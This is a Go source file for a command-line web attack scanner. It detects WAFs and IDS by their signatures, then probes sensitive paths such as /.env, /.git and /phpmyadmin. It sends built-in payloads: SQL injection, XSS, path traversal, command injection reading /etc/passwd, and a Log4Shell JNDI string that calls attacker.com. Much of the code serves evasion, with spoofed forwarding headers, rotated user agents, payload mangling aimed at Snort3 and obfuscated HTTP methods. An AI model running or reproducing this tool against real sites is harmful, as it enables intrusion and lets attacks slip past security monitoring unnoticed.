package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

// ANSI color codes
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorPurple = "\033[35m"
	ColorCyan   = "\033[36m"
	ColorWhite  = "\033[37m"
	ColorBold   = "\033[1m"
)

// ColorScheme defines a color scheme
type ColorScheme struct {
	Header    string
	Info      string
	Success   string
	Warning   string
	Error     string
	Highlight string
	Normal    string
}

// Color schemes
var ColorSchemes = map[string]ColorScheme{
	"cyber": {
		Header:    "\033[38;5;39m",
		Info:      "\033[38;5;45m",
		Success:   "\033[38;5;46m",
		Warning:   "\033[38;5;208m",
		Error:     "\033[38;5;196m",
		Highlight: "\033[38;5;51m",
		Normal:    "\033[38;5;15m",
	},
	"desert": {
		Header:    "\033[38;5;172m",
		Info:      "\033[38;5;180m",
		Success:   "\033[38;5;107m",
		Warning:   "\033[38;5;214m",
		Error:     "\033[38;5;160m",
		Highlight: "\033[38;5;220m",
		Normal:    "\033[38;5;223m",
	},
	"neon": {
		Header:    "\033[38;5;201m",
		Info:      "\033[38;5;207m",
		Success:   "\033[38;5;118m",
		Warning:   "\033[38;5;226m",
		Error:     "\033[38;5;197m",
		Highlight: "\033[38;5;213m",
		Normal:    "\033[38;5;159m",
	},
	"midnight": {
		Header:    "\033[38;5;63m",
		Info:      "\033[38;5;75m",
		Success:   "\033[38;5;79m",
		Warning:   "\033[38;5;215m",
		Error:     "\033[38;5;203m",
		Highlight: "\033[38;5;147m",
		Normal:    "\033[38;5;153m",
	},
	"blood": {
		Header:    "\033[38;5;196m",
		Info:      "\033[38;5;203m",
		Success:   "\033[38;5;107m",
		Warning:   "\033[38;5;214m",
		Error:     "\033[38;5;160m",
		Highlight: "\033[38;5;197m",
		Normal:    "\033[38;5;223m",
	},
}

// User agent list for rotation
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Android 11; Mobile; rv:90.0) Gecko/90.0 Firefox/90.0",
	"Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:90.0) Gecko/90.0 Firefox/90.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.277",
}

// WAF signatures for detection
var wafSignatures = map[string]map[string][]string{
	"Cloudflare": {
		"headers": {"CF-RAY", "CF-Cache-Status", "__cfduid", "cf-ray"},
		"body":    {"Cloudflare Ray ID:", "Attention Required! | Cloudflare", "Please turn JavaScript on and reload the page"},
	},
	"AWS WAF": {
		"headers": {"X-Amzn-Trace-Id"},
		"body":    {"Request blocked by AWS WAF"},
	},
	"ModSecurity": {
		"headers": {"Mod_Security", "NOYB"},
		"body":    {"ModSecurity Action: Access Denied", "This error was generated by mod_security"},
	},
	"Imperva Incapsula": {
		"headers": {"X-Iinfo", "X-CDN", "incap_ses_", "visid_incap_"},
		"body":    {"Access Denied - Incapsula Website Security", "Request unsuccessful. Incapsula incident ID"},
	},
	"Akamai Kona": {
		"headers": {"X-Akamai-Transformed"},
		"body":    {"Access Denied: Access Denied", "Reference #"},
	},
	"F5 BIG-IP ASM": {
		"headers": {"X-WA-Info", "TS", "BIGipServer"},
		"body":    {"Request Rejected", "The requested URL was rejected", "Please consult with your administrator"},
	},
	"Sucuri CloudProxy": {
		"headers": {"X-Sucuri-ID"},
		"body":    {"Access Denied - Sucuri Website Firewall", "Sucuri WebSite Firewall - CloudProxy - Access Denied"},
	},
	"Barracuda WAF": {
		"headers": {"barra_counter_session"},
		"body":    {"Barracuda Web Application Firewall - Access Denied", "You are being blocked by the Barracuda Web Application Firewall"},
	},
	"Citrix NetScaler AppFirewall": {
		"headers": {"ns_af", "citrix_ns_id"},
		"body":    {"Access Denied for URL", "AppFW Session ID:"},
	},
	"Wordfence": {
		"headers": {"wfvt_", "wordfence_verifiedHuman"},
		"body":    {"This response was generated by Wordfence", "Your access to this site has been limited"},
	},
	"Fortinet FortiWeb": {
		"headers": {"FORTIWAFSID"},
		"body":    {"FortiWeb Web Filtering", "FortiWeb Application Firewall"},
	},
}

// IDS/IPS detection patterns
var idsPatterns = []string{
	"Access Denied", "Forbidden", "Request Rejected",
	"Security Violation", "Intrusion Detection", "Attack Detected",
	"Suspicious Activity", "Malicious Request", "IP Blocked",
}

// Options for the scanner
type ScannerOptions struct {
	Target            string
	OutputFile        string
	ColorScheme       string
	Threads           int
	Timeout           int
	Delay             int
	Proxy             string
	UserAgentRotation bool
	EvasionTechniques bool
	Snort3Evasion     bool
	ScanPaths         []string
	CustomPayloads    []string
	Verbose           bool
}

// ScanResult represents a scan result
type ScanResult struct {
	URL          string
	StatusCode   int
	ContentLength int
	Method       string
	WAFDetected  string
	IDSDetected  bool
	Headers      map[string]string
	Interesting  bool
	Protected    bool
}

// AdvancedScanner represents the scanner
type AdvancedScanner struct {
	Options      ScannerOptions
	Results      []ScanResult
	WAFDetected  string
	IDSDetected  bool
	Client       *http.Client
	ColorScheme  ColorScheme
	Mutex        sync.Mutex
}

// NewAdvancedScanner creates a new scanner
func NewAdvancedScanner(options ScannerOptions) *AdvancedScanner {
	// Set default color scheme if not specified
	if _, ok := ColorSchemes[options.ColorScheme]; !ok {
		options.ColorScheme = "cyber"
	}

	// Create HTTP client with custom transport
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   time.Duration(options.Timeout) * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:          100,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	}

	// Set proxy if specified
	if options.Proxy != "" {
		proxyURL, err := url.Parse(options.Proxy)
		if err == nil {
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   time.Duration(options.Timeout) * time.Second,
	}

	return &AdvancedScanner{
		Options:     options,
		Results:     []ScanResult{},
		Client:      client,
		ColorScheme: ColorSchemes[options.ColorScheme],
		Mutex:       sync.Mutex{},
	}
}

// PrintColored prints a colored message
func (s *AdvancedScanner) PrintColored(message string, colorType string) {
	var color string
	switch colorType {
	case "header":
		color = s.ColorScheme.Header
	case "info":
		color = s.ColorScheme.Info
	case "success":
		color = s.ColorScheme.Success
	case "warning":
		color = s.ColorScheme.Warning
	case "error":
		color = s.ColorScheme.Error
	case "highlight":
		color = s.ColorScheme.Highlight
	default:
		color = s.ColorScheme.Normal
	}

	fmt.Printf("%s%s%s\n", color, message, ColorReset)
}

// GetRandomUserAgent returns a random user agent
func (s *AdvancedScanner) GetRandomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

// DetectWAF detects WAF based on response
func (s *AdvancedScanner) DetectWAF(resp *http.Response, body string) string {
	if s.WAFDetected != "" {
		return s.WAFDetected
	}

	for wafName, signatures := range wafSignatures {
		// Check headers
		for _, header := range signatures["headers"] {
			if resp.Header.Get(header) != "" {
				s.WAFDetected = wafName
				return wafName
			}
		}

		// Check body
		for _, pattern := range signatures["body"] {
			if strings.Contains(body, pattern) {
				s.WAFDetected = wafName
				return wafName
			}
		}
	}

	return ""
}

// DetectIDS detects IDS/IPS based on response
func (s *AdvancedScanner) DetectIDS(resp *http.Response, body string) bool {
	// Check for common IDS/IPS block patterns
	if resp.StatusCode == 403 || resp.StatusCode == 406 || resp.StatusCode == 429 || resp.StatusCode == 503 {
		for _, pattern := range idsPatterns {
			if strings.Contains(body, pattern) {
				s.IDSDetected = true
				return true
			}
		}
	}

	return false
}

// EncodePayload encodes a payload using various techniques
func (s *AdvancedScanner) EncodePayload(payload string, technique string) string {
	if technique == "" {
		techniques := []string{"url", "double_url", "unicode", "hex", "mixed"}
		technique = techniques[rand.Intn(len(techniques))]
	}

	switch technique {
	case "url":
		return url.QueryEscape(payload)
	case "double_url":
		return url.QueryEscape(url.QueryEscape(payload))
	case "unicode":
		var result strings.Builder
		for _, c := range payload {
			result.WriteString(fmt.Sprintf("\\u%04x", c))
		}
		return result.String()
	case "hex":
		return hex.EncodeToString([]byte(payload))
	case "base64":
		return base64.StdEncoding.EncodeToString([]byte(payload))
	case "mixed":
		var result strings.Builder
		for _, c := range payload {
			r := rand.Float64()
			if r < 0.2 {
				result.WriteString(url.QueryEscape(string(c)))
			} else if r < 0.4 {
				result.WriteString(fmt.Sprintf("\\u%04x", c))
			} else if r < 0.6 {
				result.WriteString(fmt.Sprintf("\\x%02x", c))
			} else {
				result.WriteString(string(c))
			}
		}
		return result.String()
	default:
		return payload
	}
}

// ApplyTCPFragmentation simulates TCP fragmentation
func (s *AdvancedScanner) ApplyTCPFragmentation(payload string) []string {
	fragments := []string{}
	fragmentSize := rand.Intn(5) + 3 // Random size between 3 and 7
	for i := 0; i < len(payload); i += fragmentSize {
		end := i + fragmentSize
		if end > len(payload) {
			end = len(payload)
		}
		fragments = append(fragments, payload[i:end])
	}
	return fragments
}

// PolymorphicPayload creates polymorphic variations of payloads
func (s *AdvancedScanner) PolymorphicPayload(payload string) string {
	replacements := map[string][]string{
		"SELECT": {"SeLeCt", "S\nELECT", "S/**/ELECT", "/*!SELECT*/"},
		"UNION":  {"UnIoN", "U\nNION", "U/**/NION", "/*!UNION*/"},
		"INSERT": {"InSeRt", "I\nNSERT", "I/**/NSERT", "/*!INSERT*/"},
		"UPDATE": {"UpDaTe", "U\nPDATE", "U/**/PDATE", "/*!UPDATE*/"},
		"DELETE": {"DeLeTe", "D\nELETE", "D/**/ELETE", "/*!DELETE*/"},
		"DROP":   {"DrOp", "D\nROP", "D/**/ROP", "/*!DROP*/"},
		"script": {"scr\nipt", "scr<!---->ipt", "scr%09ipt", "scr\tipt"},
		"alert":  {"ale\nrt", "ale<!---->rt", "ale%09rt", "ale\trt"},
		"onload": {"onlo\nad", "onlo<!---->ad", "onlo%09ad", "onlo\tad"},
		"onerror": {"oner\nror", "oner<!---->ror", "oner%09ror", "oner\tror"},
	}

	for key, values := range replacements {
		if strings.Contains(strings.ToLower(payload), strings.ToLower(key)) {
			replacement := values[rand.Intn(len(values))]
			re := regexp.MustCompile("(?i)" + key)
			payload = re.ReplaceAllString(payload, replacement)
		}
	}

	return payload
}

// HTTPMethodObfuscation obfuscates HTTP methods
func (s *AdvancedScanner) HTTPMethodObfuscation(method string) string {
	method = strings.ToUpper(method)
	if method == "GET" {
		methods := []string{"GET", "G\nET", "G%20ET", "G\tET", "Get"}
		return methods[rand.Intn(len(methods))]
	} else if method == "POST" {
		methods := []string{"POST", "P\nOST", "P%20OST", "P\tOST", "Post"}
		return methods[rand.Intn(len(methods))]
	}
	return method
}

// MakeRequest makes an HTTP request with evasion techniques
func (s *AdvancedScanner) MakeRequest(targetURL string, method string, data string, headers map[string]string, evasion bool) (*http.Response, string, error) {
	// Apply user agent rotation
	if s.Options.UserAgentRotation {
		if headers == nil {
			headers = make(map[string]string)
		}
		headers["User-Agent"] = s.GetRandomUserAgent()
	}

	// Apply evasion techniques
	if evasion && s.Options.EvasionTechniques {
		// Add random headers
		if headers == nil {
			headers = make(map[string]string)
		}
		
		// Add random headers
		randomHeaders := []string{
			fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)),
			fmt.Sprintf("X-Originating-IP: [%d.%d.%d.%d]", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)),
			fmt.Sprintf("X-Remote-Addr: %d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)),
			fmt.Sprintf("X-Remote-IP: %d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)),
		}
		
		randomHeader := randomHeaders[rand.Intn(len(randomHeaders))]
		parts := strings.SplitN(randomHeader, ": ", 2)
		if len(parts) == 2 {
			headers[parts[0]] = parts[1]
		}
		
		// Apply timing evasion
		time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond)
	}

	// Apply Snort3 specific evasion
	if evasion && s.Options.Snort3Evasion {
		if data != "" {
			data = s.PolymorphicPayload(data)
		}
		method = s.HTTPMethodObfuscation(method)
	}

	// Add delay if specified
	if s.Options.Delay > 0 {
		time.Sleep(time.Duration(s.Options.Delay) * time.Second)
	}

	// Create request
	var req *http.Request
	var err error

	if method == "GET" {
		req, err = http.NewRequest("GET", targetURL, nil)
	} else if method == "POST" {
		req, err = http.NewRequest("POST", targetURL, strings.NewReader(data))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		req, err = http.NewRequest(method, targetURL, strings.NewReader(data))
	}

	if err != nil {
		return nil, "", err
	}

	// Add headers
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	// Make request
	resp, err := s.Client.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()

	// Read body
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, "", err
	}
	bodyString := string(bodyBytes)

	// Detect WAF and IDS
	waf := s.DetectWAF(resp, bodyString)
	ids := s.DetectIDS(resp, bodyString)

	if waf != "" && s.Options.Verbose {
		s.PrintColored(fmt.Sprintf("[!] WAF Detected: %s", waf), "warning")
	}

	if ids && s.Options.Verbose {
		s.PrintColored("[!] IDS/IPS Detected", "warning")
	}

	return resp, bodyString, nil
}

// ScanPath scans a specific path
func (s *AdvancedScanner) ScanPath(path string, method string, data string) *ScanResult {
	// Construct target URL
	targetURL := s.Options.Target
	if !strings.HasSuffix(targetURL, "/") && !strings.HasPrefix(path, "/") {
		targetURL += "/"
	}
	targetURL += path

	if s.Options.Verbose {
		s.PrintColored(fmt.Sprintf("[*] Scanning: %s", targetURL), "info")
	}

	// Make request
	resp, body, err := s.MakeRequest(targetURL, method, data, nil, true)
	if err != nil {
		if s.Options.Verbose {
			s.PrintColored(fmt.Sprintf("[!] Request Error: %s", err.Error()), "error")
		}
		return nil
	}

	// Create result
	result := &ScanResult{
		URL:           targetURL,
		StatusCode:    resp.StatusCode,
		ContentLength: len(body),
		Method:        method,
		WAFDetected:   s.WAFDetected,
		IDSDetected:   s.IDSDetected,
		Headers:       make(map[string]string),
	}

	// Copy headers
	for name, values := range resp.Header {
		if len(values) > 0 {
			result.Headers[name] = values[0]
		}
	}

	// Check for interesting findings
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		if s.Options.Verbose {
			s.PrintColored(fmt.Sprintf("[+] Found: %s (Status: %d)", targetURL, resp.StatusCode), "success")
		}
		result.Interesting = true
	} else if resp.StatusCode == 401 || resp.StatusCode == 403 {
		if s.Options.Verbose {
			s.PrintColored(fmt.Sprintf("[+] Protected resource: %s (Status: %d)", targetURL, resp.StatusCode), "highlight")
		}
		result.Protected = true
	}

	// Add result to results
	s.Mutex.Lock()
	s.Results = append(s.Results, *result)
	s.Mutex.Unlock()

	return result
}

// ScanTarget scans the target with all configured paths and payloads
func (s *AdvancedScanner) ScanTarget() bool {
	s.PrintColored(fmt.Sprintf("[*] Starting advanced scan on %s", s.Options.Target), "header")
	s.PrintColored(fmt.Sprintf("[*] Using color scheme: %s", s.Options.ColorScheme), "info")

	if s.Options.EvasionTechniques {
		s.PrintColored("[*] IDS/IPS evasion techniques enabled", "info")
	}

	if s.Options.Snort3Evasion {
		s.PrintColored("[*] Snort3 specific evasion techniques enabled", "info")
	}

	// Initial request to detect WAF/IDS
	s.PrintColored("[*] Performing initial request to detect protection systems", "info")
	resp, body, err := s.MakeRequest(s.Options.Target, "GET", "", nil, false)

	if err != nil {
		s.PrintColored(fmt.Sprintf("[!] Failed to connect to target: %s", err.Error()), "error")
		return false
	}

	s.PrintColored(fmt.Sprintf("[*] Target is up (Status: %d)", resp.StatusCode), "success")

	if s.WAFDetected != "" {
		s.PrintColored(fmt.Sprintf("[!] WAF Detected: %s", s.WAFDetected), "warning")
		s.PrintColored("[*] Enabling advanced WAF bypass techniques", "info")
	}

	if s.IDSDetected {
		s.PrintColored("[!] IDS/IPS Detected", "warning")
		s.PrintColored("[*] Enabling advanced IDS/IPS bypass techniques", "info")
	}

	// Scan all paths
	s.PrintColored(fmt.Sprintf("[*] Scanning %d paths with %d threads", len(s.Options.ScanPaths), s.Options.Threads), "info")

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, s.Options.Threads)

	for _, path := range s.Options.ScanPaths {
		wg.Add(1)
		semaphore <- struct{}{}

		go func(p string) {
			defer wg.Done()
			defer func() { <-semaphore }()
			s.ScanPath(p, "GET", "")
		}(path)
	}

	// Scan with custom payloads
	if len(s.Options.CustomPayloads) > 0 {
		s.PrintColored(fmt.Sprintf("[*] Testing %d custom payloads", len(s.Options.CustomPayloads)), "info")

		for _, payload := range s.Options.CustomPayloads {
			wg.Add(1)
			semaphore <- struct{}{}

			go func(p string) {
				defer wg.Done()
				defer func() { <-semaphore }()
				encodedPayload := s.EncodePayload(p, "")
				path := fmt.Sprintf("/?test=%s", encodedPayload)
				s.ScanPath(path, "GET", "")
			}(payload)
		}
	}

	wg.Wait()

	// Generate report
	s.PrintColored(fmt.Sprintf("[*] Scan completed. Found %d results", len(s.Results)), "header")

	interestingCount := 0
	protectedCount := 0

	for _, result := range s.Results {
		if result.Interesting {
			interestingCount++
		}
		if result.Protected {
			protectedCount++
		}
	}

	s.PrintColored(fmt.Sprintf("[*] Interesting findings: %d", interestingCount), "success")
	s.PrintColored(fmt.Sprintf("[*] Protected resources: %d", protectedCount), "warning")

	// Save results to file if specified
	if s.Options.OutputFile != "" {
		file, err := os.Create(s.Options.OutputFile)
		if err != nil {
			s.PrintColored(fmt.Sprintf("[!] Error creating output file: %s", err.Error()), "error")
		} else {
			defer file.Close()

			writer := bufio.NewWriter(file)
			writer.WriteString(fmt.Sprintf("# Scan Results for %s\n\n", s.Options.Target))
			writer.WriteString(fmt.Sprintf("- Target: %s\n", s.Options.Target))
			writer.WriteString(fmt.Sprintf("- WAF Detected: %s\n", s.WAFDetected))
			writer.WriteString(fmt.Sprintf("- IDS Detected: %t\n", s.IDSDetected))
			writer.WriteString(fmt.Sprintf("- Total Results: %d\n", len(s.Results)))
			writer.WriteString(fmt.Sprintf("- Interesting Findings: %d\n", interestingCount))
			writer.WriteString(fmt.Sprintf("- Protected Resources: %d\n\n", protectedCount))

			writer.WriteString("## Detailed Results\n\n")
			for _, result := range s.Results {
				writer.WriteString(fmt.Sprintf("### %s\n", result.URL))
				writer.WriteString(fmt.Sprintf("- Status Code: %d\n", result.StatusCode))
				writer.WriteString(fmt.Sprintf("- Method: %s\n", result.Method))
				writer.WriteString(fmt.Sprintf("- Content Length: %d\n", result.ContentLength))
				writer.WriteString(fmt.Sprintf("- Interesting: %t\n", result.Interesting))
				writer.WriteString(fmt.Sprintf("- Protected: %t\n", result.Protected))
				writer.WriteString("- Headers:\n")
				for name, value := range result.Headers {
					writer.WriteString(fmt.Sprintf("  - %s: %s\n", name, value))
				}
				writer.WriteString("\n")
			}

			writer.Flush()
			s.PrintColored(fmt.Sprintf("[*] Results saved to %s", s.Options.OutputFile), "success")
		}
	}

	return true
}

func main() {
	// Parse command line flags
	targetPtr := flag.String("target", "", "Target URL to scan")
	outputPtr := flag.String("output", "", "Output file for results")
	colorSchemePtr := flag.String("color-scheme", "cyber", "Color scheme to use (cyber, desert, neon, midnight, blood)")
	threadsPtr := flag.Int("threads", 10, "Number of threads to use")
	timeoutPtr := flag.Int("timeout", 10, "Timeout for requests in seconds")
	delayPtr := flag.Int("delay", 0, "Delay between requests in seconds")
	proxyPtr := flag.String("proxy", "", "Proxy to use (e.g., http://127.0.0.1:8080)")
	evasionPtr := flag.Bool("evasion", false, "Enable IDS/IPS evasion techniques")
	snort3Ptr := flag.Bool("snort3", false, "Enable Snort3 specific evasion techniques")
	verbosePtr := flag.Bool("verbose", false, "Enable verbose output")
	pathsFilePtr := flag.String("paths-file", "", "File containing paths to scan")
	payloadsFilePtr := flag.String("payloads-file", "", "File containing custom payloads to test")

	flag.Parse()

	// Check required parameters
	if *targetPtr == "" {
		fmt.Println("Error: Target URL is required")
		flag.Usage()
		os.Exit(1)
	}

	// Ensure target has http:// or https:// prefix
	if !strings.HasPrefix(*targetPtr, "http://") && !strings.HasPrefix(*targetPtr, "https://") {
		*targetPtr = "http://" + *targetPtr
	}

	// Load paths
	scanPaths := []string{
		"/",
		"/admin",
		"/login",
		"/wp-admin",
		"/administrator",
		"/phpmyadmin",
		"/manager",
		"/api",
		"/console",
		"/backup",
		"/config",
		"/db",
		"/dev",
		"/test",
		"/tmp",
		"/.git",
		"/.env",
		"/robots.txt",
		"/sitemap.xml",
		"/server-status",
		"/server-info",
	}

	if *pathsFilePtr != "" {
		file, err := os.Open(*pathsFilePtr)
		if err == nil {
			defer file.Close()
			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				path := strings.TrimSpace(scanner.Text())
				if path != "" {
					scanPaths = append(scanPaths, path)
				}
			}
		} else {
			fmt.Printf("Error loading paths file: %s\n", err.Error())
		}
	}

	// Load custom payloads
	customPayloads := []string{
		"' OR '1'='1",
		"<script>alert(1)</script>",
		"../../../../../../etc/passwd",
		"$(cat /etc/passwd)",
		"|cat /etc/passwd",
		"' UNION SELECT 1,2,3,4,5 --",
		"admin' --",
		"1; DROP TABLE users",
		"${jndi:ldap://attacker.com/a}",
		"{{7*7}}",
	}

	if *payloadsFilePtr != "" {
		file, err := os.Open(*payloadsFilePtr)
		if err == nil {
			defer file.Close()
			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				payload := strings.TrimSpace(scanner.Text())
				if payload != "" {
					customPayloads = append(customPayloads, payload)
				}
			}
		} else {
			fmt.Printf("Error loading custom payloads file: %s\n", err.Error())
		}
	}

	// Initialize random seed
	rand.Seed(time.Now().UnixNano())

	// Configure scanner options
	options := ScannerOptions{
		Target:            *targetPtr,
		OutputFile:        *outputPtr,
		ColorScheme:       *colorSchemePtr,
		Threads:           *threadsPtr,
		Timeout:           *timeoutPtr,
		Delay:             *delayPtr,
		Proxy:             *proxyPtr,
		UserAgentRotation: true,
		EvasionTechniques: *evasionPtr,
		Snort3Evasion:     *snort3Ptr,
		ScanPaths:         scanPaths,
		CustomPayloads:    customPayloads,
		Verbose:           *verbosePtr,
	}

	// Create and run scanner
	scanner := NewAdvancedScanner(options)
	scanner.ScanTarget()
}
